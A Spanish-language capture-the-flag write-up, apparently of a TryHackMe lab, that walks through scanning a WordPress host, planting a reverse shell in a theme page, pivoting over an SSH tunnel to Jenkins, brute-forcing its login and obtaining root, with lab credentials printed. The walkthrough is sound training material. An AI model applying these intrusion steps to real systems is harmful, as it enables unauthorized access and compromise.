# Introducción

Nos encontramos exactamente igual que el anterior Write UP "Daily Bugle" debemos sacar las flags User.txt y Root.txt.

- Asegurarnos de estar en red interna:

![image](https://github.com/user-attachments/assets/3de9846c-198b-4830-9fb2-0b35215bea1e)

- Decir técnicas y herramientas utilizadas
- Localizar vulnerabilidades y anotarlas
- Envitar las flags descubiertas
- Solo la IP asiganada es la que podemos utilizar: 10.10.136.49 (en mi caso)

```
sudo nmap -sCV -T4 --min-rate 4000 -p- 10.10.136.49

Starting Nmap 7.60 ( https://nmap.org ) at 2024-11-12 14:23 GMT
Nmap scan report for ip-10-10-136-49.eu-west-1.compute.internal (10.10.136.49)
Host is up (0.00039s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (EdDSA)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:CC:FB:74:9B:D9 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.59 seconds
```

Normalmente suelo hacer escaneos probando vulnerabilidades con el mismo nmap y bastante simple y aveces puede llegar a encontrar hasta subdirectorios

```
sudo nmap -sCV -T4 -p 22,80 --script vuln 10.10.136.49

Starting Nmap 7.60 ( https://nmap.org ) at 2024-11-12 14:26 GMT
Nmap scan report for ip-10-10-136-49.eu-west-1.compute.internal (10.10.136.49)
Host is up (0.00015s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /blog/: Blog
|   /phpmyadmin/: phpMyAdmin
|   /wordpress/wp-login.php: Wordpress login page.
|_  /blog/wp-login.php: Wordpress login page.
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
MAC Address: 02:CC:FB:74:9B:D9 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Después de encontrar que es un Wordpress nos metemos y no vemos ningún lugar por donde buscar un vector, podriamos seguir enumerando pero para ello ya existe wpscan, he probado que el usuario admin existe manualmente, pero esto también me lo dirá, he probrado SqlInjection y tampoco nada y algo vulnerable:

```
wpscan --url http://internal.thm/wordpress -e
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.7
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://internal.thm/wordpress/ [10.10.136.49]
[+] Started: Tue Nov 12 14:39:54 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://internal.thm/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://internal.thm/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://internal.thm/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://internal.thm/blog/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://internal.thm/blog/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://internal.thm/wordpress/wp-content/themes/twentyseventeen/
 | Last Updated: 2024-07-16T00:00:00.000Z
 | Readme: http://internal.thm/wordpress/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 3.7
 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:00 <===================================================================================================================================> (652 / 652) 100.00% Time: 00:00:00
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:03 <=================================================================================================================================> (2575 / 2575) 100.00% Time: 00:00:03

[i] No Timthumbs Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <====================================================================================================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:00 <==========================================================================================================================================> (75 / 75) 100.00% Time: 00:00:00

[i] No DB Exports Found.

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:00 <===============================================================================================================================> (100 / 100) 100.00% Time: 00:00:00

[i] No Medias Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <=====================================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Login Error Messages (Aggressive Detection)

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Tue Nov 12 14:40:05 2024
[+] Requests Done: 3592
[+] Cached Requests: 8
[+] Data Sent: 790.936 KB
[+] Data Received: 858.601 KB
[+] Memory used: 335.793 MB
[+] Elapsed time: 00:00:11
```

```
wpscan --url http://internal.thm/wordpress -e
```

```
admin / my2boys
```

Poquito a poquito vamos sacando.

![image](https://github.com/user-attachments/assets/923c777e-bdfe-4073-b4b2-ad912ae903c7)

Que bueno nos mete la verificacion por email vamos a ver que podemos hacer 

![image](https://github.com/user-attachments/assets/1cb28be5-21e7-463d-91d5-0ba12b1bdc44)

Una vez dentro yo creo que todos sabemos por donde tirar: temas y generar una rev shell porque siempre para estos casos normalmente viene bien esto

![image](https://github.com/user-attachments/assets/918a4ea8-ba1e-422e-bac8-9cff4f66a115)

Una vez añadida la rev shell (yo recomiendo la de pentest monkey)

Tiramos a un recurso 404 por ejemplo nose un /wordpress o alguna url que sepas que no existe

![image](https://github.com/user-attachments/assets/eae94ec4-f977-4dac-ada2-1272fa64f869)

Una vez dentro vamos a enumerar a ver que podemos hacer

Para empezar enumerar el directorio home va estar comlicado, porque no tenemos permisos, vamos a probar otros vectores.

Vaya vaya después de enumerar un rato nos vamos al directorio /opt (También donde se pueden guardar muchas cosas)

![image](https://github.com/user-attachments/assets/21541c4b-242f-4763-bdcb-1173334c4d66)

Vaya vaya encontramos las credencailes de aubreanna, vamos a probar a conectarnos por ssh o hacer un su para la gente que no le apetezca ssh

```
aubreanna:bubb13guM!@#123
```

![image](https://github.com/user-attachments/assets/5afdf8ab-7a71-4b7e-8f99-91806abcfd09)

Vaya vaya y nada mas empezar ya vemos cositas, jeje, bueno vamos a sacar la user.txt y seguimos enumerando

Para empezar vemos que no tenemos acceso al sudo -l -l osea que eso por un lugar, pertenecemos a grupos que parecen ser importantnes, vamos a enumerar yo creo que con find 

```
find / -perm -u=s -type 2>/dev/null
```
Parece ser que no encontramos nada que cojones jaja.

![image](https://github.com/user-attachments/assets/77d41a4b-8526-4660-a8bd-85b4ed7f8435)

Vaya vaya, tan cerca estaba, parece ser que vamos a tener que hacer pivoting

Parecer ser que tenemos un docker en una instancia con ip 172.17.0.2:8080 vamos a ver 

Vamos a abrir un tunel ssh y posteriormente enumerar localmente


```
ssh -L 7878:172.17.0.2:8080 aubreanna@internal.thm
```

Una vez dentro del ssh nos vamos a google o el navegador y ponemos localhost:7878 o el puerto que hayais decidido

![image](https://github.com/user-attachments/assets/55555e2b-38f2-4706-bad2-274aacc889cf)

Podemos intentar hacer una fuerza bruta con el burp suite, cogiendo la consulta y posteirormente metiendole un sniper por ejemplo sabiendo que jenkins su usuario debería ser "admin"

![image](https://github.com/user-attachments/assets/6a2a6224-746b-4394-ad47-b3e337385510)

Vamos a ver si sacamos las credenciales (podemos utilizar sniper o ffuf)

```
ffuf -request [file name] -request-proto http -w /usr/share/wordlists/SecLists/Passwords/xato-net-10-million-passwords-10000.txt
```

```
admin:spongebob
```

![image](https://github.com/user-attachments/assets/73b1d192-166c-4178-b192-c08af9167111)

Estamos dentro ;) y creo que toca templateeeee ah no aqui en jenkins tiene toa la pinta de constuirse un script

Yo en mi caso he cogido este rev shell de java ya probado en jenkins : https://gist.github.com/caseydunham/53eb8503efad39b83633961f12441af0

Una vez hacemos un nc para esperar y vemos a ver si funciona 

Estamos dentro!!!

![image](https://github.com/user-attachments/assets/b1b31cac-8180-4248-8502-3b6e053bd64d)

No se ni como cojones pero hemos sacado el usuario y pass del root, en el direcotrio /opt tenemos "note.txt" GG GENTE

![image](https://github.com/user-attachments/assets/212a16f5-bef3-4404-acac-609f6915e08f)

```
root:tr0ub13guM!@#123
```

HAPPY HACKINGGG

![image](https://github.com/user-attachments/assets/b93a3b8b-31f0-4c4a-b963-3c73e7909264)














